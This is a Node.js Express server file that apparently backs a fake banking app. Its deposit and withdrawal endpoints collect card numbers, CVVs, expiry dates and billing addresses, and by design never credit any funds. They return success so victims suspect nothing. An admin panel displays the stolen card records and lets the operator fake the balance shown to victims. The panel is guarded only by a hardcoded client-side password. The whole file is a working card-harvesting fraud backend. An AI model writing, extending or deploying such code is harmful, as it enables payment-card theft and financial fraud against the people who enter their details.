const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// In-memory storage (replace with a database in production)
let balance = 678;
let transactions = [
    { type: 'Deposit', amount: 5000, date: 'Mar 1, 2025' },
    { type: 'Deposit', amount: 2000, date: 'Mar 5, 2025' },
    { type: 'Deposit', amount: 1000, date: 'Mar 10, 2025' },
    { type: 'Withdrawal', amount: 6856, date: 'Mar 17, 2025' }
];
let cardRecords = [];

// API Endpoints for Frontend
app.get('/api/balance', (req, res) => {
    res.json({ balance });
});

app.get('/api/history', (req, res) => {
    res.json(transactions);
});

app.get('/api/card-records', (req, res) => {
    res.json(cardRecords);
});

app.post('/api/deposit', (req, res) => {
    const { amount, ...cardDetails } = req.body;
    const depositAmount = parseFloat(amount);
    
    if (isNaN(depositAmount) || depositAmount <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
    }

    // Store card details but don't update balance or transactions
    const date = new Date().toLocaleString('en-US', { month: 'numeric', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
    cardRecords.unshift({ type: 'Deposit', amount: depositAmount, ...cardDetails, date });

    // Respond to keep the frontend request from timing out
    res.json({ success: true });
});

app.post('/api/withdraw', (req, res) => {
    const { amount, ...cardDetails } = req.body;
    const withdrawAmount = parseFloat(amount);
    
    if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
    }

    // Store card details but don't update balance or transactions
    const date = new Date().toLocaleString('en-US', { month: 'numeric', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
    cardRecords.unshift({ type: 'Withdrawal', amount: withdrawAmount, ...cardDetails, date });

    // Respond to keep the frontend request from timing out
    res.json({ success: true });
});

app.post('/api/update-balance', (req, res) => {
    const { newBalance } = req.body;
    const parsedBalance = parseFloat(newBalance);
    
    if (isNaN(parsedBalance) || parsedBalance < 0) {
        return res.status(400).json({ error: 'Invalid balance' });
    }
    
    balance = parsedBalance;
    const date = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
    transactions.unshift({ type: 'Admin Update', amount: parsedBalance, date });
    res.json({ success: true, newBalance: balance });
});

app.post('/api/delete-record', (req, res) => {
    const { index } = req.body;
    if (index >= 0 && index < cardRecords.length) {
        cardRecords.splice(index, 1);
        res.json({ success: true });
    } else {
        res.status(400).json({ error: 'Invalid record index' });
    }
});

// Admin Interface with Password Protection
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Panel</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    padding: 20px;
                    max-width: 800px;
                    margin: 0 auto;
                    background-color: #f5f5f5;
                }
                h1 {
                    color: #1564C0;
                    text-align: center;
                }
                .section {
                    margin-bottom: 30px;
                    padding: 20px;
                    border: 1px solid #ddd;
                    border-radius: 8px;
                    background-color: white;
                    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                }
                .section h2 {
                    color: #1564C0;
                    margin-top: 0;
                }
                input[type="number"], input[type="password"] {
                    padding: 10px;
                    margin: 10px 0;
                    width: 200px;
                    border: 1px solid #ddd;
                    border-radius: 5px;
                    font-size: 16px;
                }
                button {
                    padding: 10px 20px;
                    background-color: #1564C0;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-size: 16px;
                    transition: background-color 0.3s;
                }
                button:hover {
                    background-color: #0d4a9f;
                }
                .record {
                    padding: 15px;
                    margin: 10px 0;
                    background-color: #f9f9f9;
                    border-radius: 8px;
                    border: 1px solid #ddd;
                    position: relative;
                    line-height: 1.6;
                }
                .delete-btn {
                    position: absolute;
                    top: 15px;
                    right: 15px;
                    background-color: #ff4d4d;
                    padding: 8px 15px;
                    font-size: 14px;
                }
                .delete-btn:hover {
                    background-color: #e60000;
                }
                .error {
                    color: red;
                    text-align: center;
                    margin: 10px 0;
                }
                .auth-section {
                    text-align: center;
                }
            </style>
        </head>
        <body>
            <div id="auth-section" class="auth-section">
                <h1>Admin Panel</h1>
                <div class="section">
                    <h2>Authentication</h2>
                    <input type="password" id="passwordInput" placeholder="Enter password">
                    <button onclick="checkPassword()">Login</button>
                    <p id="error-message" class="error"></p>
                </div>
            </div>

            <div id="admin-content" style="display: none;">
                <h1>Admin Panel</h1>
                
                <div class="section">
                    <h2>Balance Settings</h2>
                    <input type="number" id="balanceInput" value="${balance}" step="0.01">
                    <button onclick="updateBalance()">Update Balance</button>
                    <p>Current Balance: $${balance.toFixed(2)}</p>
                </div>
                
                <div class="section">
                    <h2>Card Records</h2>
                    <div id="cardRecords">
                        ${cardRecords.map((record, index) => `
                            <div class="record">
                                <strong>${record.type}</strong><br>
                                Timestamp: ${record.date}<br>
                                Amount: $${parseFloat(record.amount).toFixed(2)}<br>
                                Card Number: ${record.cardNumber}<br>
                                Expiration: ${record.expiringDate}<br>
                                CVV: ${record.cvv}<br>
                                Cardholder Name: ${record.cardholdername}<br>
                                Billing Address: ${record.billingAddress}<br>
                                State: ${record.state}<br>
                                City: ${record.city}<br>
                                Zip Code: ${record.zipCode}<br>
                                <button class="delete-btn" onclick="deleteRecord(${index})">Delete</button>
                            </div>
                        `).join('')}
                    </div>
                </div>
            </div>

            <script>
                function checkPassword() {
                    const password = document.getElementById('passwordInput').value;
                    const errorMessage = document.getElementById('error-message');
                    if (password === 'ethical19') {
                        document.getElementById('auth-section').style.display = 'none';
                        document.getElementById('admin-content').style.display = 'block';
                    } else {
                        errorMessage.textContent = 'Incorrect password. Please try again.';
                    }
                }

                async function updateBalance() {
                    const newBalance = document.getElementById('balanceInput').value;
                    const response = await fetch('/api/update-balance', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ newBalance })
                    });
                    const data = await response.json();
                    if (data.success) {
                        location.reload();
                    } else {
                        alert('Error updating balance');
                    }
                }

                async function deleteRecord(index) {
                    if (confirm('Are you sure you want to delete this record?')) {
                        const response = await fetch('/api/delete-record', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ index })
                        });
                        const data = await response.json();
                        if (data.success) {
                            location.reload();
                        } else {
                            alert('Error deleting record');
                        }
                    }
                }
            </script>
        </body>
        </html>
    `);
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
